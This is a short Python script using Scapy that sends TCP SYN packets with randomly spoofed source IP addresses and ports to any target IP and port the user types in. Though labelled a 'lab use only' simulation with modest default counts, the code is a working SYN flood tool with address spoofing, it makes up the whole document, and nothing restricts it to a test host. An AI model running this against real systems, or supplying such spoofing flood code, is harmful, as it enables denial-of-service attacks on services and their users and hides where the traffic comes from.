# syn_demo.py
# SYN packet simulation using Scapy (lab use only)

from scapy.all import IP, TCP, send
import random
import time


def create_syn_packet(dst_ip, dst_port):
    """
    Create a TCP SYN packet with random source IP and port
    """
    src_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    src_port = random.randint(1024, 65535)
    seq = random.randint(1000, 999999)

    packet = IP(src=src_ip, dst=dst_ip) / \
             TCP(sport=src_port, dport=dst_port, flags="S", seq=seq)

    return packet


def syn_simulation(target_ip, target_port, total_packets=150, delay=0.02):
    """
    Send SYN packets with slight delay (safe lab simulation)
    """
    print(f"\n[+] Starting SYN simulation → {target_ip}:{target_port}")

    sent = 0

    for i in range(total_packets):
        pkt = create_syn_packet(target_ip, target_port)
        send(pkt, verbose=False)

        sent += 1

        if sent % 20 == 0:
            print(f"[INFO] Sent {sent} packets")

        time.sleep(delay)

    print(f"\n[✓] Done. Total packets sent: {sent}")


if __name__ == "__main__":
    target = input("Enter target IP: ")
    port = int(input("Enter target port (e.g. 80): "))

    syn_simulation(target, port)
